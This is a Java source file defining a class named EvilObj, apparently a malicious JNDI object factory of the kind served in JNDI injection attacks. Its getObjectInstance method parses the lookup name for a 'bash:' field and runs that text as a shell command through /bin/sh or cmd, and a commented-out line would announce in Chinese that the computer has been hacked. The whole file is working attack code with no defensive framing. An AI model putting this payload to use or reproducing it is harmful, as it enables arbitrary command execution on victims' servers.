package com.jndi.entity;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import javax.swing.*;
import java.io.File;
import java.util.Hashtable;

public class EvilObj implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        String info = null;
        try {
//            JOptionPane.showMessageDialog(null, "你的电脑已经被我入侵了！！！");
//            String k = "xed";
            String url = name.toString();
            String[] cmds;
            String k = "";
            String[] arr = url.split(";");
            for(String a : arr){
                String[] kv = a.split(":");
                String c = kv[1];
                switch (kv[0]){
                    case "bash":
                        k = c;
                        break;
                    case "info":
                        info = c;
                        break;
                    default:
                        break;
                }
            }
            if (File.separator.equals("/")) {
                cmds = new String[]{"/bin/sh", "-c", k};
            } else {
                cmds = new String[]{"cmd", "/C", k};
            }
            Runtime.getRuntime().exec(cmds);
        } catch (Exception e){
            info = "hellokitty";
        }
        return info;
    }

}